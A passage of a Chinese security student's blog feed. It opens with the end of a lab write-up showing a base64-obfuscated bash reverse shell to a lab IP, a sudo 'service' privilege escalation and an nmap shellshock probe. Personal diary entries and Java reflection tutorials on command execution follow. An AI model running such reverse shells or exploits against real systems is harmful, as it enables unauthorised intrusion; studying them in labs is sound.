<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMi80NDQ1IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}</p>
<p>硬弹成功</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214626-eeecw1a.png" alt="image"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214636-9cch9od.png" alt="image"></p>
<p>sudo权限</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214745-9eksbpe.png" alt="image"></p>
<p>一手service sudo提权，谢幕</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829215035-ou1c0r6.png" alt="image"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829215125-n0pthmt.png" alt="image"></p>
<p>这画的是啥。。。</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829215226-eewii68.png" alt="image"></p>
<p>是个锤子</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>nmap扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -p80 --script http-shellshock uri=/cgi-bin/shell.sh,cmd=<span class="built_in">ls</span> ip</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>写给自己3.0</title>
    <url>/2022/08/28/20220829%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1v3/</url>
    <content><![CDATA[<blockquote>
<p>2022-08-28</p>
</blockquote>
<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>最近翻到一年多前自己写的emo小日记（文后附上，当作纪念），不禁感叹时光飞快，转眼明天就是大三，迎接我的将是实习，公考，工作。这一年起起伏伏，也有许多感想，于是作此文当作发泄、反省、总结以及新的开始。</p>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>总感觉时间还在一年前，这一年疫情反弹，在宿舍网课的时间和在家里的时间占了大多数，我感觉自己变得越来越宅，越来越不愿意与人交流，每天陪伴我大多数的都是电脑和手机平板。现在出去和人正常对话都觉得吃力，作息也开始变得习惯，白天容易困，晚上睡不着。大脑接受了太多网上的消息却来不及消化，只觉得脑子里一切都很乱，很多东西都想不明白，于是继续靠网络麻痹自己。</p>
<p>看了太多东西，难免对自己的现状产生不满，与其说是不满，不如说我无法改变这一现状。现实与我的想象相差甚大，倒不如说之前老师画的饼，在这个暑假全成了泡影。</p>
<p>未来4-5年，我的人生将会按部就班，无法改变，我也无力改变。我可能唯一一条路就是去派c所实习，公考，毕业，然后回老家的派c所上班。网安对我来说，似乎已经没有继续学下去的意义。s厅特z今年开始也不再招实习生，苏z市j网安不招毕业生，选择考研无疑等于放弃公考，放弃公考，读这个学校的意义就没了。我能做的只有和学校里大多数人一样，准备接下来要走的流程。润更加不可能，家里条件有限，本身dang建也有材料，签证难度加大，学分也不够，没法申请国外大学（很难）。复读也过了年龄。我的近5年唯一结局，只可能是回老家派c所当个小民j。（仔细研究过以后无其他出路）</p>
<p><em>(已删除不适宜内容，保命)</em></p>
<p>顿时感觉自己学了这么久的东西都没意义了。</p>
<p>技术啥的，在我们学校已经一文不值，社团也散了，都散了。曾经我还有一个复兴攻防社的梦，现在看来，都是笑话。这个学校对我唯一的价值就是，认识到的好兄弟以及毕业公考，已经没有任何可为之期待的东西了。当然在公考这方面，学校还是很给力的，我所叹的，只是这个氛围，以及我无法改变的未来。</p>
<p>现在的我，未来在学校只有一个目标，锻炼身体，好好公考，好好过好在学校的每一天，毕竟大学生活还是很短暂的，马上就要毕业了。</p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>我还想继续学下去，这一年认识了太多人，和他们交流的过程也是我学习的过程。计算机也变成了我自己的兴趣，兴趣是最好的老师，当他从我就业的压力中消失，顿时感觉学习的过程十分轻松。我还想继续学下去，无论是红队，ctf，编程之类，不想局限于之前的仅仅的web，想去学习更多的关于计算机组成，底层原理，还有编程开发类的知识。</p>
<p>后来我也发现，未来五年可能我改变不了的是我的工作，但是我可以一直学下去，这和工作并不冲突，学习是无止境的事情，知识就是力量，并不是为了找到高薪的工作，为了跳出体zhi，走出派出s，而是因为我自己的快乐，为了我自己的满足而学习。</p>
<p>我相信我还会继续成长，入了这个坑，确实已经沉迷其中了。更何况还有一帮志同道合的师傅们一起，这一年也打了大大小小的比赛，比赛都很有意思，也拿了一些小成绩。我发现在这条道路上，即便学校里没有一起学的人，但我并不孤独。我只想珍惜我所拥有的这一切。</p>
<p>时常会做一个梦。梦到电脑，梦里的东西留不住，醒来就没了，但是醒来之后发现我有一台自己的电脑，感觉真好。</p>
<p>end</p>
<h1 id="附：写给自己1-0-amp-写给自己2-0"><a href="#附：写给自己1-0-amp-写给自己2-0" class="headerlink" title="附：写给自己1.0 &amp; 写给自己2.0"></a>附：写给自己1.0 &amp; 写给自己2.0</h1><blockquote>
<p>2021-04-02<br>纯日记，4月2号一个人在306。无技术类内容，重在<strong>回顾反思</strong>。</p>
</blockquote>
<p><em><strong>No hand can make the clock strike for me the hours that are passed.</strong></em></p>
<p>自从2020年八月份进校至今已经八个月，来机房学习大约也有了四五个月，军训的时候买了第一本《白帽子讲web安全》，至今没有看完，9，10月份进入了大数据班，那个时候纯属贪可以不上晚自习的假，晚上可以在b01待到很晚，最开始是学python，爬虫，没怎么学好，之后看到同班的同学晚上会去306机房，我也死皮赖脸地让总区带我去， 心情忐忑地到五楼给大队长交请假条， 大队长人真的很好，没问什么就签了字同意了，真的感谢他。</p>
<p>当时我几乎不认识什么人，除了一起在大数据班的总区比较熟之外，基本都是生面孔，在306也只是自己摆弄自己的电脑，像无头苍蝇一样乱学，现在看来浪费了大量的时间，因为学习方向和方法都不正确，产出必然很小，加上当时又没有整理复习的习惯。引用Marlous师傅博客里的一句话，<strong>遗忘会让所有的投入都白白浪费</strong>。那个时候还会打游戏和复习白天上课的东西，参加官微和学校的很多社团活动拿pu分，pu分是拿到了，但是学习却没怎么提升。</p>
<p>方向不明确就像在黑暗里行船， 即惶恐又绝望。</p>
<p>于是求知欲战胜了我的社恐，有一天晚上在306，机房只剩几个人，我发现当时入校的时候给我们做讲座的李学长还在，我就死皮赖脸地去问他。李学长人特好，给我讲了半个多小时，当时感觉黑暗中顿时有了一束光芒。我第一次了解信安也是通过他的讲座，他也是我加的第一个学长的wx。当时特别珍惜他讲的每一句话， 都记了下来，因为那个时候大四学长都在忙公考，之后我也很少叨扰，当时他愿意和我讲解很多，我一直特别感激，铭记于心。</p>
<p>后来有一次半夜从机房回宿舍，看到一个人在大队展板前面伫立许久，好像是之前辩论赛的时候主持的19级学长，果不其然，过了一会就看到了一条朋友圈，我看了深有同感，之后又有一次机会在306和宇轩哥哥聊了许多，很多大学里生活里的事情，慢慢地就变得熟了，3月份有一次自闭也是他带我走了出来hhh。</p>
<p>之后的转机是大队的攻防选拔，19学长办了一个小的ctf比赛，当时我还不是太了解ctf（包括现在也是），web题目就签到题水准，但是当时好像只有我做出来了后面几道，分数排在第二，第一是一个女生，她做出来了所有的linux题目，当时我还不怎么熟练linux命令，所以基本没做。不知道为什么之后也没有办攻防培训，逐渐我又回到了一个人瞎学的状态。</p>
<p>也就是那段时间每天看着黑白之道的公众号，看着自己根本看不懂的推文，在网上找各种推文，之前一个宿舍一起学的谈恋爱去了，当时我也谈了个恋爱，异地恋，于是每天又有一部分时间花在这个上面，总之学的也不是很好。但那个时候开始，我对网络安全的兴趣慢慢变得越来越大，也对这个方面的东西开始有了更多了解，报了个渗透班天天看网课，对一些基本的漏洞、工具、论坛啥的也有了了解，但也疏忽了一些基础语言的学习。</p>
<p>也就是那段时间我认识了许多学长，18的谈学长和杨学长，谈学长给我他珍藏的kali课我一直在学，还有19的阮学长、王学长、苏学长、李学长等等等等。我发现大队在课外网安的学习方面十分有氛围，即便有一些历史因素，但是每个人都是如此热爱技术，热爱网安，并且勤奋，在这个氛围下我的干劲十足， 但是当时我的学习还是存在问题，导致今天来看成效不大。</p>
<p>然后就是寒假，整个寒假开始十几天还每天看看渗透班的网课，之后被高中同学拉去玩，一发不可收拾，醉生梦死。<strong>我也发现自己很容易受周边环境影响，</strong> 一个人住，没爸妈管，番剧美剧一部接着一部，生物钟彻底紊乱让我精神恍惚，现在一想起来寒假的状态就会冒冷汗，这和废人没有区别。</p>
<p>回校之后感谢学长让我又呆在了306，一个偶然的契机，我加了一个ctf的群，通过那个群，我参加了几个网赛，题目没做出来几道，群加了一堆，我才看到了ctf这个圈子。</p>
<p>也就是那个时候，我看到了世界很大，高手很多，题目很难， 我很菜。</p>
<p>有很多和我一样大一的师傅，他们很厉害， 出赛题办比赛，他们每天学习的东西都比我多，并且方向都比我明确，学习方法都比我好，他们的学校有专门的社团，工作室，有路线培训等等等等。我逐渐意识到这样下去，差距只会越来越大，我的进步甚至只会越来越小。</p>
<p>然后就自闭了，宇轩哥哥帮我走了出来。</p>
<p>我发现网上的圈子很重要，不但能交流方向，还能让我时刻意识到自己和别人的差距，还能学到很多自己一个人没法学到的。我认识了一个别的学校大一的web手，和我一样都是起步，我们每天一起交流学习，让我进步了许多。学长公考考完了，他们也很乐意和我们分享当时他们打ctf学网安的经验，李学长和陈学长给了我们许多建议方向，与他们的聊天中我感觉自己成长了许多。这段时间的学习也是重在方法改进，提升效率上，看了很多大佬的博客，学到了很多经验。每天的学习做题也是，终于感觉时间没有白费。</p>
<p>不为别的，就是感兴趣。我想我唯一拥有的筹码只有兴趣和勤奋了。<br><strong>希望把安全作为终身学习与追求的东西。</strong></p>
<p>aeqaq<br>2021&#x2F;04&#x2F;02</p>
<h1 id="写给自己2-0"><a href="#写给自己2-0" class="headerlink" title="写给自己2.0"></a>写给自己2.0</h1><blockquote>
<p>2021-11-05</p>
</blockquote>
<h1 id="00"><a href="#00" class="headerlink" title="00"></a>00</h1><p>很久没打理博客了，美亚杯结束了，成绩还行，个人二等奖团体一等奖。加上之前的长安杯一等奖，今年的取证比赛告一段落，</p>
<p>谁能想到今年上半年的中科实数杯，当时我的队伍连三等奖都没拿到，就在本校办的比赛，当时我心情很难受，甚至想放弃取证，后来老师拉了一把，让我做了今年学校的能力测验，才开始重新做取证题目。</p>
<p>朝夕相处的同学马上要去实习，一想到接下来一年可能我都会一个人待在实验室，也有点恍惚。</p>
<p>距离上次写这种emo文章过去了大半年，但我感觉已经过去了很长很长时间。</p>
<p>我jb啥也不是，写这些东西也都是给自己看的。</p>
<h1 id="01"><a href="#01" class="headerlink" title="01"></a>01</h1><p>或许这次美亚杯如此认真备赛的原因，还是我想证明自己。</p>
<p>2021年5月9日，中科实数杯，呆坐如喽啰。当时大一有好多支队伍拿了三等奖、优胜奖，而我只拿了个鼓励奖。看到那张奖状上面鼓励奖三个大字，真的很不是滋味。</p>
<p>再不济，用用现成的软件分析分析，也不会只有鼓励奖啊。</p>
<p>什么是鼓励奖，就是可怜你才给你的奖。</p>
<p>我不相信我只能拿鼓励奖。</p>
<h1 id="02"><a href="#02" class="headerlink" title="02"></a>02</h1><p>我的偶像有很多，远哥，六神，北山，月球好多好多，还有网上的那些大师傅，虽然我不认识他们，他们也不认识我，但是我从他们身上学到很多。</p>
<p>如今我让感受最深的，就是“耐得住寂寞”这句话。以及Y4tacker师傅写下的，“你越安静，你听到的东西越多 。”</p>
<p>最近我也有在没人的地方，盘腿坐下冥想，虽然只是刚开始练习，但看着自己的思绪从路边像车子一样来来往往，感觉心里又静了下来。</p>
<p>沉淀，是我接下来一年要做的事情，就像刚泡开水的茶叶，我要一点一点沉入杯底。</p>
<h1 id="03"><a href="#03" class="headerlink" title="03"></a>03</h1><p>19的师兄要去实习了，18的学长也快工作了。留给我的时间也不多了，但确确实实还有一年。</p>
<p>就像一个被告知还有一年可活的病人，我感到了前所未有的焦虑。想学的东西很多，时间又不够，学校里的破事永远都不停，永远有人看你不爽，永远有人背后捅你刀子，说实在的，系里学习氛围真差。</p>
<p>但这些都和我有什么关系呢。我想我的队友永远只有19的那一帮和Blank了。</p>
<p>时间已经证明了很多东西，也让我看清了很多人。</p>
<p>时间，看起来很多，但是却又很少。</p>
<h1 id="04"><a href="#04" class="headerlink" title="04"></a>04</h1><p>每天看着之前上了别的大学的同学发朋友圈，似乎都找到对象了。</p>
<p>其实大一也谈过2个，一个校外的一个同届不同系的，分手的原因都是我整天在机房陪电脑。</p>
<p>如今我坚持着的恋爱观，依旧还是schoolgirlbyebye所说的：“既是朋友又是恋人”吧。</p>
<p>而且人本来就是孤独的，珍惜和自己独处的时光，陪伴自己才是真的。</p>
<p>还是要耐得住寂寞。</p>
<h1 id="05"><a href="#05" class="headerlink" title="05"></a>05</h1><p>结束语</p>
<p>沉淀并且安静下来吧。</p>
]]></content>
  </entry>
  <entry>
    <title>JAVA反射</title>
    <url>/2022/03/04/JAVA%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h1 id="反射的概念"><a href="#反射的概念" class="headerlink" title="反射的概念"></a>反射的概念</h1><p>java反射机制不是很陌生的东西，总结一波反射中重要的概念：</p>
<ol>
<li>Java 反射机制允许<strong>运行中的</strong>Java程序获取<strong>自身的信息, 操作类和对象的内部属性.</strong></li>
</ol>
<p>&#x3D;&#x3D;&gt;<strong>“ 动态获取信息 “ 和 “ 动态调用属性方法 “</strong></p>
<p>&#x3D;&#x3D;&gt;对象实例可以通过反射机制获取它的类（类类型）</p>
<p>&#x3D;&#x3D;&gt;类可以通过反射机制获取它的所有方法和属性</p>
<p>&#x3D;&#x3D;&gt;获取的属性可以设值，获取的方法可以调用</p>
<p>反射最重要的用途是开发各种通用框架 . 很多框架都是通过XML文件来进行配置的( 例如 struts.xml , spring-*.xml 等 ) , 即所谓的框架核心配置文件 . 为了确保框架的通用性 , 程序<strong>运行时</strong>需要根据配置文件中对应的内容<strong>加载</strong>不同的类或对象 , 调用不同的方法 , 这也依赖于 Java 反射机制 .</p>
<p>总的来说，通过反射我们可以：：</p>
<ol>
<li><strong>获得一个对象所属的类</strong></li>
<li><strong>获得任意一个类的成员变量和方法</strong></li>
<li><strong>构造任意一个类的对象</strong></li>
<li><strong>任意调用一个对象的方法</strong></li>
</ol>
<p>纸上得来终觉浅，还是需要多实践来获得更深的理解</p>
<p>反射的具体应用，在上一篇里面写的很详细</p>
<h1 id="通过反射RCE"><a href="#通过反射RCE" class="headerlink" title="通过反射RCE"></a>通过反射RCE</h1><h2 id="java-lang-Runtime"><a href="#java-lang-Runtime" class="headerlink" title="java.lang.Runtime"></a>java.lang.Runtime</h2><p>第一个写的详细一点</p>
<p><img src="https://o.130014.xyz/2022/03/04/image-20220304012210-bbgk8za.png" alt="image-20220304012210-bbgk8za.png"></p>
<p>java.lang.Runtime 类的 exec() 方法是Java中最常见的执行命令的方式</p>
<p>我们可以通过forName方法来加载任何类，当然也可以加载Runtime。</p>
<p>调用exec方法的两个条件：</p>
<ol>
<li><p>一个实例对象，可以通过newInstance方法拿到</p>
</li>
<li><p>获取到具体的exec方法，反射中要获取一个方法需要知道方法名和参数类型</p>
</li>
</ol>
<h3 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h3><p>1.获取exec方法</p>
<p>（这里抛出了很多异常，暂时不讨论）</p>
<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013024-fncppyt.png" alt="image-20220304013024-fncppyt.png"></p>
<p>2.获取实例对象然后尝试调用</p>
<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013242-v57tfyw.png" alt="image-20220304013242-v57tfyw.png"></p>
<p>报错了，查看报错信息：</p>
<p>class com.io.EncodingDemo cannot access a member of class java.lang.Runtime (in module java.base) with modifiers “private”</p>
<p>跟进到Runtime方法里，发现他的构造方法是private，而newInstance会默认调用无参构造方法，这里牵扯到java的设计模式中的单例设计，比如在学习Servlet的时候遇到的ServletContext。</p>
<blockquote>
<p>单例模式有 3 个特点：<br>单例类只有一个实例对象；<br>该单例对象必须由单例类<strong>自行创建；</strong><br>单例类对外提供一个访问该单例的全局访问点。</p>
<p><a href="http://c.biancheng.net/view/1338.html">http://c.biancheng.net/view/1338.html</a></p>
</blockquote>
<p>因此不能直接调用newInstance，要通过单例模式设计对象中的获取实例的方法，来获取一个runtime实例</p>
<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013856-gl5a5gu.png" alt="image-20220304013856-gl5a5gu.png"></p>
<p>由于exec返回的是一个Process对象，我们要通过字节流把结果读出来</p>
<p><a href="https://zhuanlan.zhihu.com/p/44957705">https://zhuanlan.zhihu.com/p/44957705</a></p>
<p><img src="https://o.130014.xyz/2022/03/04/image-20220304015412-we3v4tx.png" alt="image-20220304015412-we3v4tx.png"></p>
<h3 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodingDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(cls);</span><br><span class="line">        execMethod.invoke(runtime,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看Epicccal师傅的博客中得知</p>
<p>我们可以通过 <strong><code>对象.方法名</code> 来调用实例方法</strong> , <strong><code>类名.方法名</code> 来调用静态方法</strong> , 那么反过来 , <strong><code>方法名.invoke(对象)</code></strong> 可以映射成 <strong><code>方法名.invoke(类)</code></strong></p>
<p>接着通过p牛的漫谈，思考下面几个问题</p>
<h3 id="类没有无参构造方法，没有单例模式里的静态方法"><a href="#类没有无参构造方法，没有单例模式里的静态方法" class="headerlink" title="类没有无参构造方法，没有单例模式里的静态方法"></a>类没有无参构造方法，没有单例模式里的静态方法</h3><p>我们可以使用getConstructor方法，获取构造函数信息，它被封装在java.lang.reflect.Constructor中，当然他也需要特定的函数名和参数列表来获取这个唯一的构造函数</p>
<p>获取到构造函数之后，用newInstance来执行</p>
<p>例如ProcessBuilder类</p>
<p><img src="https://o.130014.xyz/2022/03/04/image-20220304111005-qs9ld14.png" alt="image-20220304111005-qs9ld14.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>

<p>这里进行了强制类型转换，也就是直接调用了实例之后的ProcessBuilder，我们也可用反射来调用start</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>



<h3 id="构造方法是私有方法，如何执行"><a href="#构造方法是私有方法，如何执行" class="headerlink" title="构造方法是私有方法，如何执行"></a>构造方法是私有方法，如何执行</h3><p>例子就是上面的Runtime类</p>
<p>我们使用getDeclaredMethod方法，它能获取的是当前类中“声明”的方法，包括了私有方法，但不包括从父类继承过来的方法</p>
<p>getMethod方法只能获取公共方法和从父类继承的方法</p>
<p>我们在获取到一个私有方法后，必须用setAccessible 修改它的作用域，否则仍然不能调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; c = clazz.getDeclaredConstructor();</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>


<h2 id="java-lang-ProcessBuilder"><a href="#java-lang-ProcessBuilder" class="headerlink" title="java.lang.ProcessBuilder"></a>java.lang.ProcessBuilder</h2><p>上文的Runtime类的exec方法，实质上就是通过ProcessBuilder来执行命令，通过跟进exec方法我们可以发现：</p>
<p><img src="https://o.130014.xyz/2022/03/04/image-20220304113001-sz96lzx.png" alt="image-20220304113001-sz96lzx.png"></p>
<p>我们直接通过ProcessBuilder执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>可以通过cmdarray，传入数组来执行带参数的数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Arrays.asList(<span class="string">&quot;ping&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p>王哥，我的超人</p>
<p><a href="https://forum.butian.net/share/1333">https://forum.butian.net/share/1333</a></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVAWEB基础知识</title>
    <url>/2022/03/03/JAVAWEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本章不涉及安全部份，为学习javaweb安全的必备基础，为以后学习铺垫。</p>
<h1 id="资源-amp-书签索引"><a href="#资源-amp-书签索引" class="headerlink" title="资源&amp;书签索引"></a>资源&amp;书签索引</h1><p>java代码审之路<a href="https://www.cnblogs.com/afanti/p/13156152.html">https://www.cnblogs.com/afanti/p/13156152.html</a></p>
<p>靶场<a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a> </p>
<h1 id="java反射机制详解"><a href="#java反射机制详解" class="headerlink" title="java反射机制详解"></a>java反射机制详解</h1><h2 id="网课笔记"><a href="#网课笔记" class="headerlink" title="网课笔记"></a>网课笔记</h2><p>课程：<a href="https://www.imooc.com/learn/199">https://www.imooc.com/learn/199</a></p>
<p>（老师的声音有点像蕾丝</p>
<h3 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h3><p>class类是java.lang中的类，java中的class类只能由JVM访问。</p>
<p>任何一个类都是<strong>Class类的实例对象</strong>，这个实例对象有三种表达方式</p>
<p>我们也可以通过类的类型来实例化这个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Foo</span> <span class="variable">foo1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Foo.class;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> foo1.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*c1,c2表示Foo类的Class type*/</span></span><br><span class="line"><span class="comment">//        System.out.println(c1==c2);//true</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c3 = Class.forName(<span class="string">&quot;com.day1.Foo&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(c3==c2);<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 可以通过该类的类型来创建这个类的对象实例</span></span><br><span class="line"><span class="comment">        * 但是要进行强制类型转换</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Foo</span> <span class="variable">foo</span> <span class="operator">=</span> (Foo) c3.newInstance();</span><br><span class="line">        foo.print();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Foo print&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Java动态加载类"><a href="#Java动态加载类" class="headerlink" title="Java动态加载类"></a>Java动态加载类</h3><p>Class.forName()表示了动态加载类，表示动态编译。</p>
<p>编译时加载类是静态加载类</p>
<p>运行时加载类是动态加载类</p>
<h3 id="获取方法信息"><a href="#获取方法信息" class="headerlink" title="获取方法信息"></a>获取方法信息</h3><p>基本的数据类型也存在对应的类类型</p>
<p>编写一个工具类进行练习，存在一个打印传入类信息的方法，使用反射实现</p>
<p>方法信息被封装在java.lang.reflect.Method中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassUtil</span> &#123;</span><br><span class="line">    <span class="comment">//打印类的信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printClassMessage</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="comment">//获取类类型</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="comment">//获取类的名称</span></span><br><span class="line">        System.out.println(<span class="string">&quot;该类的名称是==&gt;&quot;</span>+c.getName());</span><br><span class="line">        <span class="comment">//获取类的方法信息</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Method类，方法对象</span></span><br><span class="line"><span class="comment">        * 一个成员方法就是一个Method对象</span></span><br><span class="line"><span class="comment">        * getMethods()方法获取的是所有public函数，包括从父类继承来的</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Method[] methods = c.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">            <span class="comment">//得到方法返回值类型</span></span><br><span class="line">            Class&lt;?&gt; returnType = methods[i].getReturnType();</span><br><span class="line">            System.out.print(returnType.getName()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">//方法名</span></span><br><span class="line">            System.out.print(methods[i].getName()+<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            <span class="comment">//参数类型</span></span><br><span class="line">            Class&lt;?&gt;[] parameterTypes = methods[i].getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (Class class1 : parameterTypes)&#123;</span><br><span class="line">                System.out.print(class1.getName()+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="获取其他的信息"><a href="#获取其他的信息" class="headerlink" title="获取其他的信息"></a>获取其他的信息</h3><p>我们可以通过类类型(Class Type)来获取方法信息，也就说明我们可以通过它获取别的信息</p>
<p>例如成员变量信息，它被封装在java.lang.reflect.Field中</p>
<p>构造函数信息，它被封装在java.lang.reflect.Constructor中</p>
<p>我们可以通过对象来获取到类的其他信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出类的Field信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printFieldMessage</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    Class&lt;?&gt; c = obj.getClass();</span><br><span class="line">    <span class="comment">//Field[] fs = c.getFields();</span></span><br><span class="line">    Field[] fs = 